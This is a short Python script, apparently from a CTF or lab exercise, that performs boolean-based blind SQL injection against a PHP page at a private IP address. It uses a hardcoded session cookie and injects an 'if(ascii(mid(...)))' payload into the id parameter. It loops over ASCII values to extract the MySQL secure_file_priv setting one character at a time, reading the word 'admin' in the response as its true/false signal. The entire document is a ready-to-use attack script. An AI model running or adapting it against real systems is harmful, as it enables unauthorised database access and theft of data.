import requests

def boolblind(url,cookie,guess_length):
    flag = ""
    isEnd = False
    guess_pos=1
    while(not isEnd and guess_pos<=guess_length):
        isEnd=True
        for i in range(32,126):
            res = requests.get(url.format(str(guess_pos),str(i)),cookies=cookie)
            if b'admin' in res.content:
                flag+=chr(i)
                print(str(guess_pos)+"********:"+flag)
                guess_pos=guess_pos+1
                isEnd = False
                break
    return
            
url_temple="http://172.16.0.207:18917/user/user.php?id=1^(if(ascii(mid(@@secure_file_priv,{0},1))={1},0,1))"
cookie = {'PHPSESSID':'v25mfj5v7jk6hr75ds0p5k41s7'}
boolblind(url_temple,cookie,20)        

